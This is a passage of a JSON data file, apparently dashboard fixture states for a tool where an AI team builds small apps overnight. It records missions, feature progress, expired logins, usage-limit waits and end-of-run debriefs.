Claude also needs a new login."},"fileChangedAt":null,"fileChangedText":null},"timeline":{"items":[{"at":1791712680000,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-photo-album","featureId":null,"tone":"info","text":"Started working on “Photo album”.","note":null,"author":"engine","count":1},{"at":1791712683000,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-photo-album","featureId":null,"tone":"info","text":"The plan is ready: 3 features.","note":null,"author":"engine","count":1},{"at":1791712687500,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-photo-album","featureId":null,"tone":"good","text":"The app's foundation is ready.","note":null,"author":"engine","count":1},{"at":1791712689000,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-photo-album","featureId":"upload","tone":"good","text":"“Upload photos” is built and checked.","note":null,"author":"engine","count":1},{"at":1791712696000,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-photo-album","featureId":"albums","tone":"info","text":"Started on “Albums”.","note":null,"author":"engine","count":1},{"at":1791712698000,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-photo-album","featureId":null,"tone":"warn","text":"Waiting for allowance until 12:59. Claude also needs a new login.","note":null,"author":"engine","count":1}],"earlierNotShown":0},"debrief":null,"counts":{"unreadableMissions":0,"openFromBefore":0,"olderNeedYou":0,"olderWaitingForYou":0,"tonightMissions":1,"featuresDone":1,"featuresTotal":3,"featuresLine":"1 of 3 features done","questions":0,"stuckFeatures":0,"olderMissionsHidden":0},"leader":{"quickPhrases":["Your call","Leave it out","Try again","What is going on?"],"globalSentence":"About tonight's run: \u003cyour answer here>","stopSentence":"Please stop tonight's run.","pasteHint":"Paste this into your chat with the leader.","copyFailHint":"Select the text and copy it","aiNotice":"The AI wrote this. Do not run commands from it.","canDo":"The leader can check progress, read logs and reports, stop the run, start a new request or a follow-up, and run the night. It cannot reopen a feature or change a plan in place.","stopNote":"Stopping cancels the AI step that is running, and up to 45 minutes of its work is redone. Restarting needs the PC or the next scheduled run."}},"failed-auth":{"schemaVersion":1,"generatedAt":1791713010000,"generatedAtText":"10:03:30","freshness":{"pollEveryMs":4000,"staleAfterMs":30000,"notRespondingAfterMs":300000,"notUpdatingText":"Not updating","notUpdating":{"state":"needs_look","word":"Needs a look","sentence":"Not updating. The page has had no news for a while.","reasons":[{"code":"page_stale","severity":"look","text":"the page has had no news for a while","missionId":null,"featureId":null}]},"notResponding":{"state":"not_responding","word":"Not responding","sentence":"No news for 5 minutes. The last known state is shown greyed out.","reasons":[{"code":"no_news","severity":"look","text":"no news for 5 minutes","missionId":null,"featureId":null}]}},"lamp":{"state":"needs_you_now","word":"Needs you now","sentence":"“Recipe box” needs your help.","reasons":[{"code":"mission_failed","severity":"now","text":"“Recipe box” needs your help","missionId":"2026-10-11-recipe-box","featureId":null}]},"run":{"active":false,"heartbeat":"none","startedAt":null,"startedAtText":null,"runningMs":null,"runningText":null,"heartbeatAgeMs":null,"heartbeatText":null,"stopRequested":false,"lastActivityAt":null,"lastActivityText":null,"deadline":null,"line":"No run is working right now.","activityLine":null},"now":null,"missions":[{"id":"2026-10-11-recipe-box","title":"Recipe box","readable":true,"kind":"new_app","kindWord":"new app","scope":"tonight","openFromBefore":false,"state":"needs_you","word":"Needs you","sentence":"It needs your help.","pausedWhy":null,"progress":[{"id":"plan","word":"Plan","state":"done"},{"id":"plan_check","word":"Plan check","state":"done"},{"id":"build","word":"Build","state":"current"},{"id":"final_check","word":"Final check","state":"todo"},{"id":"landed","word":"Landed","state":"todo"}],"progressWord":"Build","repairLap":false,"featuresDone":0,"featuresTotal":2,"featuresLine":"0 of 2 features done","waiting":null,"features":[{"id":"recipes-list","title":"Recipe list","state":"paused","word":"Paused","reason":{"text":"Paused. It continues on the next run.","author":"engine"},"steps":{"used":0,"total":5,"caption":"No tries yet"},"reinforcements":0,"recovered":false,"acceptanceTests":1,"isRepair":false,"cardId":null,"tellLeader":"About \"Recipe list\" in Recipe box: \u003cyour answer here>"},{"id":"recipe-search","title":"Recipe search","state":"waiting_turn","word":"Waiting its turn","reason":null,"steps":{"used":0,"total":5,"caption":"No tries yet"},"reinforcements":0,"recovered":false,"acceptanceTests":0,"isRepair":false,"cardId":null,"tellLeader":"About \"Recipe search\" in Recipe box: \u003cyour answer here>"}],"updatedAt":1791712699069,"tellLeader":"About \"Recipe box\": \u003cyour answer here>"}],"needsYou":[{"id":"mission_failed:2026-10-11-recipe-box:0","kind":"mission_failed","severity":"now","missionId":"2026-10-11-recipe-box","missionTitle":"Recipe box","fromBefore":false,"featureId":null,"title":"“Recipe box” needs your help","happened":{"text":"A login has expired. Claude or Codex has to be logged in again on the PC.","author":"engine"},"summary":null,"ifNothing":"Once the login works, the next run carries on by itself.","tellLeader":"About \"Recipe box\", which stopped: \u003cyour answer here>"}],"allowance":{"providers":[{"id":"claude","label":"Claude","pill":{"state":"no_reading","word":"No reading yet"},"windows":[],"note":"No usage reading yet.","limitedUntil":null,"limitedText":null},{"id":"codex","label":"Codex","pill":{"state":"no_reading","word":"No reading yet"},"windows":[],"note":"No usage reading yet.","limitedUntil":null,"limitedText":null}],"waiting":null,"fileChangedAt":null,"fileChangedText":null},"timeline":{"items":[{"at":1791712698384,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-recipe-box","featureId":null,"tone":"info","text":"Started working on “Recipe box”.","note":null,"author":"engine","count":1},{"at":1791712698389,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-recipe-box","featureId":null,"tone":"info","text":"The plan is ready: 2 features.","note":null,"author":"engine","count":1},{"at":1791712698677,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-recipe-box","featureId":null,"tone":"good","text":"The app's foundation is ready.","note":null,"author":"engine","count":1},{"at":1791712699041,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-recipe-box","featureId":"recipes-list","tone":"info","text":"Wrote 1 check that “Recipe list” must pass. The AI that builds it cannot change it.","note":null,"author":"engine","count":1},{"at":1791712699064,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-recipe-box","featureId":null,"tone":"bad","text":"A login has expired.","note":null,"author":"engine","count":2},{"at":1791712699069,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-recipe-box","featureId":null,"tone":"bad","text":"“Recipe box” needs your help.","note":{"text":"A login has expired. Claude or Codex has to be logged in again on the PC.","author":"engine"},"author":"engine","count":1}],"earlierNotShown":0},"debrief":{"verdict":{"id":"needs_you","word":"Needs you","sentence":"It needs your help."},"missions":[{"missionId":"2026-10-11-recipe-box","title":"Recipe box","verdict":{"id":"needs_you","word":"Needs you","sentence":"It needs your help."},"plannedLine":"2 features planned","got":[],"leftOut":[],"recovered":[],"ticks":[{"id":"delivered","label":"Delivered","state":"no","why":"0 of 2 features were built and checked.","caveat":null},{"id":"final_review","label":"Final review passed","state":"no","why":"The final check did not run.","caveat":null},{"id":"nothing_open","label":"Nothing open","state":"no","why":"1 item is waiting for you.","caveat":null},{"id":"no_rework","label":"No rework","state":"yes","why":"The final check did not send the team back for a repair round.","caveat":null}],"agentTimeText":"less than a minute of AI work","agentRuns":7,"tellLeader":"About \"Recipe box\": \u003cyour answer here>"}],"allowanceNote":"The AI work runs on your existing Claude and Codex plans, so there is no separate bill. This page cannot show your share of the week yet.","honestyNote":"These are the AI team's own checks, not a human review."},"counts":{"unreadableMissions":0,"openFromBefore":0,"olderNeedYou":0,"olderWaitingForYou":0,"tonightMissions":1,"featuresDone":0,"featuresTotal":2,"featuresLine":"0 of 2 features done","questions":0,"stuckFeatures":0,"olderMissionsHidden":0},"leader":{"quickPhrases":["Your call","Leave it out","Try again","What is going on?"],"globalSentence":"About tonight's run: \u003cyour answer here>","stopSentence":"Please stop tonight's run.","pasteHint":"Paste this into your chat with the leader.","copyFailHint":"Select the text and copy it","aiNotice":"The AI wrote this. Do not run commands from it.","canDo":"The leader can check progress, read logs and reports, stop the run, start a new request or a follow-up, and run the night. It cannot reopen a feature or change a plan in place.","stopNote":"Stopping cancels the AI step that is running, and up to 45 minutes of its work is redone. Restarting needs the PC or the next scheduled run."}},"multi-mission":{"schemaVersion":1,"generatedAt":1791713010000,"generatedAtText":"10:03:30","freshness":{"pollEveryMs":4000,"staleAfterMs":30000,"notRespondingAfterMs":300000,"notUpdatingText":"Not updating","notUpdating":{"state":"needs_look","word":"Needs a look","sentence":"Not updating. The page has had no news for a while.","reasons":[{"code":"page_stale","severity":"look","text":"the page has had no news for a while","missionId":null,"featureId":null}]},"notResponding":{"state":"not_responding","word":"Not responding","sentence":"No news for 5 minutes. The last known state is shown greyed out.","reasons":[{"code":"no_news","severity":"look","text":"no news for 5 minutes","missionId":null,"featureId":null}]}},"lamp":{"state":"needs_you_now","word":"Needs you now","sentence":"“Recipe box” needs your help and 1 feature is stuck.","reasons":[{"code":"mission_failed","severity":"now","text":"“Recipe box” needs your help","missionId":"2026-10-11-recipe-box","featureId":null},{"code":"feature_stuck","severity":"look","text":"1 feature is stuck","missionId":null,"featureId":null}]},"run":{"active":false,"heartbeat":"none","startedAt":null,"startedAtText":null,"runningMs":null,"runningText":null,"heartbeatAgeMs":null,"heartbeatText":null,"stopRequested":false,"lastActivityAt":null,"lastActivityText":null,"deadline":null,"line":"No run is working right now.","activityLine":null},"now":null,"missions":[{"id":"2026-10-11-habit-tracker","title":"Habit tracker","readable":true,"kind":"new_app","kindWord":"new app","scope":"tonight","openFromBefore":false,"state":"done","word":"Done","sentence":"All 4 features are built and checked.","pausedWhy":null,"progress":[{"id":"plan","word":"Plan","state":"done"},{"id":"plan_check","word":"Plan check","state":"done"},{"id":"build","word":"Build","state":"done"},{"id":"final_check","word":"Final check","state":"done"},{"id":"landed","word":"Landed","state":"done"}],"progressWord":"Landed","repairLap":false,"featuresDone":4,"featuresTotal":4,"featuresLine":"4 of 4 features done","waiting":null,"features":[{"id":"add-habit","title":"Add and name a habit","state":"done","word":"Done","reason":null,"steps":{"used":1,"total":5,"caption":"Tried 1 time (1 build try)"},"reinforcements":0,"recovered":false,"acceptanceTests":1,"isRepair":false,"cardId":null,"tellLeader":"About \"Add and name a habit\" in Habit tracker: \u003cyour answer here>"},{"id":"daily-checkin","title":"Daily check-in","state":"done","word":"Done","reason":null,"steps":{"used":1,"total":5,"caption":"Tried 1 time (1 build try)"},"reinforcements":0,"recovered":false,"acceptanceTests":1,"isRepair":false,"cardId":null,"tellLeader":"About \"Daily check-in\" in Habit tracker: \u003cyour answer here>"},{"id":"streak-count","title":"Streak counter","state":"done","word":"Done","reason":null,"steps":{"used":1,"total":5,"caption":"Tried 1 time (1 build try)"},"reinforcements":0,"recovered":false,"acceptanceTests":1,"isRepair":false,"cardId":null,"tellLeader":"About \"Streak counter\" in Habit tracker: \u003cyour answer here>"},{"id":"weekly-chart","title":"Weekly streak chart","state":"done","word":"Done","reason":null,"steps":{"used":1,"total":5,"caption":"Tried 1 time (1 build try)"},"reinforcements":0,"recovered":false,"acceptanceTests":1,"isRepair":false,"cardId":null,"tellLeader":"About \"Weekly streak chart\" in Habit tracker: \u003cyour answer here>"}],"updatedAt":1791712693376,"tellLeader":"About \"Habit tracker\": \u003cyour answer here>"},{"id":"2026-10-11-members-site","title":"Members site","readable":true,"kind":"new_app","kindWord":"new app","scope":"tonight","openFromBefore":false,"state":"partly_done","word":"Partly done","sentence":"2 of 4 features are built and checked. 1 feature is stuck. 1 feature was left out.","pausedWhy":null,"progress":[{"id":"plan","word":"Plan","state":"done"},{"id":"plan_check","word":"Plan check","state":"done"},{"id":"build","word":"Build","state":"done"},{"id":"final_check","word":"Final check","state":"done"},{"id":"landed","word":"Landed","state":"done"}],"progressWord":"Landed","repairLap":false,"featuresDone":2,"featuresTotal":4,"featuresLine":"2 of 4 features done","waiting":null,"features":[{"id":"signup","title":"Sign-up page","state":"stuck","word":"Stuck","reason":{"text":"I need to know which payment provider you want (Stripe or PayPal) before sign-up can be finished; I cannot choose for you.","author":"ai"},"steps":{"used":3,"total":5,"caption":"Tried 3 times (2 build tries and 1 expert diagnosis)"},"reinforcements":2,"recovered":false,"acceptanceTests":1,"isRepair":false,"cardId":"feature_stuck:2026-10-11-members-site:signup","tellLeader":"About \"Sign-up page\" in Members site: \u003cyour answer here>"},{"id":"pay-subscription","title":"Paid subscription","state":"left_out","word":"Left out","reason":{"text":"It needed “Sign-up page”, which is stuck.","author":"engine"},"steps":{"used":0,"total":5,"caption":"No tries yet"},"reinforcements":0,"recovered":false,"acceptanceTests":0,"isRepair":false,"cardId":null,"tellLeader":"About \"Paid subscription\" in Members site: \u003cyour answer here>"},{"id":"welcome-email","title":"Welcome email","state":"done","word":"Done","reason":null,"steps":{"used":1,"total":5,"caption":"Tried 1 time (1 build try)"},"reinforcements":0,"recovered":false,"acceptanceTests":1,"isRepair":false,"cardId":null,"tellLeader":"About \"Welcome email\" in Members site: \u003cyour answer here>"},{"id":"settings","title":"Settings page","state":"done","word":"Done","reason":null,"steps":{"used":1,"total":5,"caption":"Tried 1 time (1 build try)"},"reinforcements":0,"recovered":false,"acceptanceTests":1,"isRepair":false,"cardId":null,"tellLeader":"About \"Settings page\" in Members site: \u003cyour answer here>"}],"updatedAt":1791712697573,"tellLeader":"About \"Members site\": \u003cyour answer here>"},{"id":"2026-10-11-recipe-box","title":"Recipe box","readable":true,"kind":"new_app","kindWord":"new app","scope":"tonight","openFromBefore":false,"state":"needs_you","word":"Needs you","sentence":"It needs your help.","pausedWhy":null,"progress":[{"id":"plan","word":"Plan","state":"done"},{"id":"plan_check","word":"Plan check","state":"done"},{"id":"build","word":"Build","state":"current"},{"id":"final_check","word":"Final check","state":"todo"},{"id":"landed","word":"Landed","state":"todo"}],"progressWord":"Build","repairLap":false,"featuresDone":0,"featuresTotal":2,"featuresLine":"0 of 2 features done","waiting":null,"features":[{"id":"recipes-list","title":"Recipe list","state":"paused","word":"Paused","reason":{"text":"Paused. It continues on the next run.","author":"engine"},"steps":{"used":0,"total":5,"caption":"No tries yet"},"reinforcements":0,"recovered":false,"acceptanceTests":1,"isRepair":false,"cardId":null,"tellLeader":"About \"Recipe list\" in Recipe box: \u003cyour answer here>"},{"id":"recipe-search","title":"Recipe search","state":"waiting_turn","word":"Waiting its turn","reason":null,"steps":{"used":0,"total":5,"caption":"No tries yet"},"reinforcements":0,"recovered":false,"acceptanceTests":0,"isRepair":false,"cardId":null,"tellLeader":"About \"Recipe search\" in Recipe box: \u003cyour answer here>"}],"updatedAt":1791712699069,"tellLeader":"About \"Recipe box\": \u003cyour answer here>"},{"id":"2026-10-11-task-board","title":"Task board","readable":true,"kind":"new_app","kindWord":"new app","scope":"tonight","openFromBefore":false,"state":"done","word":"Done","sentence":"All 3 features are built and checked.","pausedWhy":null,"progress":[{"id":"plan","word":"Plan","state":"done"},{"id":"plan_check","word":"Plan check","state":"done"},{"id":"build","word":"Build","state":"done"},{"id":"final_check","word":"Final check","state":"done"},{"id":"landed","word":"Landed","state":"done"}],"progressWord":"Landed","repairLap":false,"featuresDone":3,"featuresTotal":3,"featuresLine":"3 of 3 features done","waiting":null,"features":[{"id":"list-tasks","title":"Task list","state":"done","word":"Done","reason":null,"steps":{"used":1,"total":5,"caption":"Tried 1 time (1 build try)"},"reinforcements":0,"recovered":false,"acceptanceTests":1,"isRepair":false,"cardId":null,"tellLeader":"About \"Task list\" in Task board: \u003cyour answer here>"},{"id":"add-task","title":"Add a task","state":"done","word":"Done","reason":null,"steps":{"used":1,"total":5,"caption":"Tried 1 time (1 build try)"},"reinforcements":0,"recovered":false,"acceptanceTests":1,"isRepair":false,"cardId":null,"tellLeader":"About \"Add a task\" in Task board: \u003cyour answer here>"},{"id":"done-task","title":"Mark a task done","state":"done","word":"Done","reason":null,"steps":{"used":1,"total":5,"caption":"Tried 1 time (1 build try)"},"reinforcements":0,"recovered":false,"acceptanceTests":1,"isRepair":false,"cardId":null,"tellLeader":"About \"Mark a task done\" in Task board: \u003cyour answer here>"}],"updatedAt":1791712704802,"tellLeader":"About \"Task board\": \u003cyour answer here>"},{"id":"2026-10-11-reader","title":"Reader","readable":true,"kind":"new_app","kindWord":"new app","scope":"tonight","openFromBefore":false,"state":"done","word":"Done","sentence":"All 2 features are built and checked.","pausedWhy":null,"progress":[{"id":"plan","word":"Plan","state":"done"},{"id":"plan_check","word":"Plan check","state":"done"},{"id":"build","word":"Build","state":"done"},{"id":"final_check","word":"Final check","state":"done"},{"id":"landed","word":"Landed","state":"done"}],"progressWord":"Landed","repairLap":false,"featuresDone":2,"featuresTotal":2,"featuresLine":"2 of 2 features done","waiting":null,"features":[{"id":"feed","title":"News feed","state":"done","word":"Done","reason":null,"steps":{"used":1,"total":5,"caption":"Tried 1 time (1 build try)"},"reinforcements":0,"recovered":false,"acceptanceTests":1,"isRepair":false,"cardId":null,"tellLeader":"About \"News feed\" in Reader: \u003cyour answer here>"},{"id":"bookmark","title":"Bookmarks","state":"done","word":"Done","reason":null,"steps":{"used":1,"total":5,"caption":"Tried 1 time (1 build try)"},"reinforcements":0,"recovered":false,"acceptanceTests":1,"isRepair":false,"cardId":null,"tellLeader":"About \"Bookmarks\" in Reader: \u003cyour answer here>"}],"updatedAt":1791723565596,"tellLeader":"About \"Reader\": \u003cyour answer here>"}],"needsYou":[{"id":"mission_failed:2026-10-11-recipe-box:0","kind":"mission_failed","severity":"now","missionId":"2026-10-11-recipe-box","missionTitle":"Recipe box","fromBefore":false,"featureId":null,"title":"“Recipe box” needs your help","happened":{"text":"A login has expired. Claude or Codex has to be logged in again on the PC.","author":"engine"},"summary":null,"ifNothing":"Once the login works, the next run carries on by itself.","tellLeader":"About \"Recipe box\", which stopped: \u003cyour answer here>"},{"id":"feature_stuck:2026-10-11-members-site:signup","kind":"feature_stuck","severity":"look","missionId":"2026-10-11-members-site","missionTitle":"Members site","fromBefore":false,"featureId":"signup","title":"“Sign-up page” is stuck","happened":{"text":"I need to know which payment provider you want (Stripe or PayPal) before sign-up can be finished; I cannot choose for you.","author":"ai"},"summary":"Tried 3 times (2 build tries and 1 expert diagnosis).","ifNothing":"It stays out. Nothing tries it again unless you ask. “Paid subscription” needed it, so that stays out too.","tellLeader":"About \"Sign-up page\" in Members site, which is stuck: \u003cyour answer here>"}],"allowance":{"providers":[{"id":"claude","label":"Claude","pill":{"state":"no_reading","word":"No reading yet"},"windows":[],"note":"No usage reading yet.","limitedUntil":null,"limitedText":null},{"id":"codex","label":"Codex","pill":{"state":"waiting_reset","word":"Waiting for reset"},"windows":[],"note":"No usage reading yet.","limitedUntil":1791723505596,"limitedText":"Waiting for the 5-hour limit to reset. Work resumes at 12:59."}],"waiting":null,"fileChangedAt":1791712680000,"fileChangedText":"Usage figures last changed at 09:58"},"timeline":{"items":[{"at":1791712689053,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-habit-tracker","featureId":null,"tone":"info","text":"Started working on “Habit tracker”.","note":null,"author":"engine","count":1},{"at":1791712689101,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-habit-tracker","featureId":null,"tone":"info","text":"The plan is ready: 4 features.","note":null,"author":"engine","count":1},{"at":1791712689392,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-habit-tracker","featureId":null,"tone":"good","text":"The app's foundation is ready.","note":null,"author":"engine","count":1},{"at":1791712690212,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-habit-tracker","featureId":"add-habit","tone":"good","text":"“Add and name a habit” is built and checked.","note":null,"author":"engine","count":1},{"at":1791712691051,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-habit-tracker","featureId":"daily-checkin","tone":"good","text":"“Daily check-in” is built and checked.","note":null,"author":"engine","count":1},{"at":1791712691992,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-habit-tracker","featureId":"streak-count","tone":"good","text":"“Streak counter” is built and checked.","note":null,"author":"engine","count":1},{"at":1791712692918,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-habit-tracker","featureId":"weekly-chart","tone":"good","text":"“Weekly streak chart” is built and checked.","note":null,"author":"engine","count":1},{"at":1791712692939,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-habit-tracker","featureId":null,"tone":"info","text":"The building is finished. Starting the final check.","note":null,"author":"engine","count":1},{"at":1791712693207,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-habit-tracker","featureId":null,"tone":"good","text":"The final tests of the whole app passed.","note":null,"author":"engine","count":1},{"at":1791712693376,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-habit-tracker","featureId":null,"tone":"good","text":"Finished “Habit tracker”: done.","note":null,"author":"engine","count":1},{"at":1791712694163,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-members-site","featureId":null,"tone":"info","text":"Started working on “Members site”.","note":null,"author":"engine","count":1},{"at":1791712694172,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-members-site","featureId":null,"tone":"info","text":"The plan is ready: 4 features.","note":null,"author":"engine","count":1},{"at":1791712694423,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-members-site","featureId":null,"tone":"good","text":"The app's foundation is ready.","note":null,"author":"engine","count":1},{"at":1791712694973,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-members-site","featureId":"signup","tone":"warn","text":"“Sign-up page” did not pass its checks. Calling in reinforcements (step 2 of 5).","note":null,"author":"engine","count":1},{"at":1791712695214,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-members-site","featureId":"signup","tone":"warn","text":"“Sign-up page” did not pass its checks. Calling in reinforcements (step 3 of 5).","note":null,"author":"engine","count":1},{"at":1791712695275,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-members-site","featureId":"signup","tone":"bad","text":"“Sign-up page” is stuck.","note":{"text":"I need to know which payment provider you want (Stripe or PayPal) before sign-up can be finished; I cannot choose for you.","author":"ai"},"author":"ai","count":1},{"at":1791712695278,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-members-site","featureId":"pay-subscription","tone":"warn","text":"“Paid subscription” was left out because it needed a stuck feature.","note":null,"author":"engine","count":1},{"at":1791712696223,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-members-site","featureId":"welcome-email","tone":"good","text":"“Welcome email” is built and checked.","note":null,"author":"engine","count":1},{"at":1791712697188,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-members-site","featureId":"settings","tone":"good","text":"“Settings page” is built and checked.","note":null,"author":"engine","count":1},{"at":1791712697212,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-members-site","featureId":null,"tone":"info","text":"The building is finished. Starting the final check.","note":null,"author":"engine","count":1},{"at":1791712697449,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-members-site","featureId":null,"tone":"good","text":"The final tests of the whole app passed.","note":null,"author":"engine","count":1},{"at":1791712697573,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-members-site","featureId":null,"tone":"warn","text":"Finished “Members site”: partly done.","note":null,"author":"engine","count":1},{"at":1791712698384,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-recipe-box","featureId":null,"tone":"info","text":"Started working on “Recipe box”.","note":null,"author":"engine","count":1},{"at":1791712698389,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-recipe-box","featureId":null,"tone":"info","text":"The plan is ready: 2 features.","note":null,"author":"engine","count":1},{"at":1791712698677,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-recipe-box","featureId":null,"tone":"good","text":"The app's foundation is ready.","note":null,"author":"engine","count":1},{"at":1791712699041,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-recipe-box","featureId":"recipes-list","tone":"info","text":"Wrote 1 check that “Recipe list” must pass. The AI that builds it cannot change it.","note":null,"author":"engine","count":1},{"at":1791712699064,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-recipe-box","featureId":null,"tone":"bad","text":"A login has expired.","note":null,"author":"engine","count":2},{"at":1791712699069,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-recipe-box","featureId":null,"tone":"bad","text":"“Recipe box” needs your help.","note":{"text":"A login has expired. Claude or Codex has to be logged in again on the PC.","author":"engine"},"author":"engine","count":1},{"at":1791712699847,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-task-board","featureId":null,"tone":"info","text":"Started working on “Task board”.","note":null,"author":"engine","count":1},{"at":1791712699853,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-task-board","featureId":null,"tone":"info","text":"The plan is ready: 3 features.","note":null,"author":"engine","count":1},{"at":1791712700124,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-task-board","featureId":null,"tone":"good","text":"The app's foundation is ready.","note":null,"author":"engine","count":1},{"at":1791712700991,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-task-board","featureId":"list-tasks","tone":"good","text":"“Task list” is built and checked.","note":null,"author":"engine","count":1},{"at":1791712703517,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-task-board","featureId":"add-task","tone":"good","text":"“Add a task” is built and checked.","note":null,"author":"engine","count":1},{"at":1791712704402,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-task-board","featureId":"done-task","tone":"good","text":"“Mark a task done” is built and checked.","note":null,"author":"engine","count":1},{"at":1791712704422,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-task-board","featureId":null,"tone":"info","text":"The building is finished. Starting the final check.","note":null,"author":"engine","count":1},{"at":1791712704677,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-task-board","featureId":null,"tone":"good","text":"The final tests of the whole app passed.","note":null,"author":"engine","count":1},{"at":1791712704802,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-task-board","featureId":null,"tone":"good","text":"Finished “Task board”: done.","note":null,"author":"engine","count":1},{"at":1791712705596,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-reader","featureId":null,"tone":"info","text":"Started working on “Reader”.","note":null,"author":"engine","count":1},{"at":1791712705596,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-reader","featureId":null,"tone":"info","text":"The plan is ready: 2 features.","note":null,"author":"engine","count":1},{"at":1791712705596,"time":"09:58","day":"Sun 11 Oct","missionId":"2026-10-11-reader","featureId":null,"tone":"warn","text":"Waiting for allowance until 12:59. It resumes by itself.","note":null,"author":"engine","count":1},{"at":1791723565596,"time":"12:59","day":"Sun 11 Oct","missionId":"2026-10-11-reader","featureId":null,"tone":"good","text":"The app's foundation is ready.","note":null,"author":"engine","count":1},{"at":1791723565596,"time":"12:59","day":"Sun 11 Oct","missionId":"2026-10-11-reader","featureId":"feed","tone":"good","text":"“News feed” is built and checked.","note":null,"author":"engine","count":1},{"at":1791723565596,"time":"12:59","day":"Sun 11 Oct","missionId":"2026-10-11-reader","featureId":"bookmark","tone":"good","text":"“Bookmarks” is built and checked.","note":null,"author":"engine","count":1},{"at":1791723565596,"time":"12:59","day":"Sun 11 Oct","missionId":"2026-10-11-reader","featureId":null,"tone":"info","text":"The building is finished. Starting the final check.","note":null,"author":"engine","count":1},{"at":1791723565596,"time":"12:59","day":"Sun 11 Oct","missionId":"2026-10-11-reader","featureId":null,"tone":"good","text":"The final tests of the whole app passed.","note":null,"author":"engine","count":1},{"at":1791723565596,"time":"12:59","day":"Sun 11 Oct","missionId":"2026-10-11-reader","featureId":null,"tone":"good","text":"Finished “Reader”: done.","note":null,"author":"engine","count":1}],"earlierNotShown":0},"debrief":{"verdict":{"id":"needs_you","word":"Needs you","sentence":"5 missions: 3 done, 1 partly done, 1 needs your help."},"missions":[{"missionId":"2026-10-11-habit-tracker","title":"Habit tracker","verdict":{"id":"done","word":"Done","sentence":"All 4 features are built and checked."},"plannedLine":"4 features planned","got":[{"featureId":"add-habit","title":"Add and name a habit","note":{"text":"As a user I can add a habit with a name.","author":"ai"},"attempts":1},{"featureId":"daily-checkin","title":"Daily check-in","note":{"text":"As a user I can tick a habit off for today.","author":"ai"},"attempts":1},{"featureId":"streak-count","title":"Streak counter","note":{"text":"As a user I see my current streak.","author":"ai"},"attempts":1},{"featureId":"weekly-chart","title":"Weekly streak chart","note":{"text":"As a user I see a chart of my week.","author":"ai"},"attempts":1}],"leftOut":[],"recovered":[],"ticks":[{"id":"delivered","label":"Delivered","state":"yes","why":"All 4 features were built and checked.","caveat":null},{"id":"final_review","label":"Final review passed","state":"yes","why":"The final review ran and found no serious problem.","caveat":null},{"id":"nothing_open","label":"Nothing open","state":"yes","why":"Nothing is waiting for you.","caveat":null},{"id":"no_rework","label":"No rework","state":"yes","why":"The final check did not send the team back for a repair round.","caveat":null}],"agentTimeText":"less than a minute of AI work","agentRuns":21,"tellLeader":"About \"Habit tracker\": \u003cyour answer here>"},{"missionId":"2026-10-11-members-site","title":"Members site","verdict":{"id":"partly_done","word":"Partly done","sentence":"2 of 4 features are built and checked. 1 feature is stuck."},"plannedLine":"4 features planned","got":[{"featureId":"welcome-email","title":"Welcome email","note":{"text":"As a new user I get a welcome email.","author":"ai"},"attempts":1},{"featureId":"settings","title":"Settings page","note":{"text":"As a user I can change my name.","author":"ai"},"attempts":1}],"leftOut":[{"featureId":"signup","title":"Sign-up page","note":{"text":"I need to know which payment provider you want (Stripe or PayPal) before sign-up can be finished; I cannot choose for you.","author":"ai"},"attempts":3},{"featureId":"pay-subscription","title":"Paid subscription","note":{"text":"It needed “Sign-up page”, which is stuck.","author":"engine"},"attempts":0}],"recovered":[],"ticks":[{"id":"delivered","label":"Delivered","state":"no","why":"2 of 4 features were built and checked. 1 is stuck. 1 was left out.","caveat":null},{"id":"final_review","label":"Final review passed","state":"yes","why":"The final review 